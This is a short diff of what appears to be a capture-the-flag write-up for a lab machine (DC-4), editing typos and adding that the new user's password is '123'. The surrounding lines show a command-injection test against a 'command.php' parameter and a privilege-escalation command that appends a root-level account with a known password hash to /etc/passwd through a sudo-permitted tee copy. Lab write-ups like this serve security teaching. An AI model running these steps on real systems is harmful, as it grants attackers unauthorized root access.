@@ -77,7 +77,7 @@ drwxr-xr-x 2 root root 4096 Mar 24  2019 images
 ...
 ```
 
-The input parameter look juicy. Lets try to change the value of the parameter to `id` to see if we can send arbitrary commands.
+The input parameter looks juicy. Lets try to change the value of the parameter to `id` to see if we can send arbitrary commands.
 ```http
 POST /command.php HTTP/1.1
 Host: 192.168.193.195
@@ -375,7 +375,7 @@ Now we add this line to `/etc/passwd` using the `tee` binary we identified.
 printf 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash\n' | sudo /usr/bin/teehee -a /etc/passwd
 ```
 
-Lets check if we have a `root` account now.
+Lets check if we have a `root` account now by switching to user `new` with the password `123`.
 ```bash
 charles@dc-4:~$ su new
 Password: 
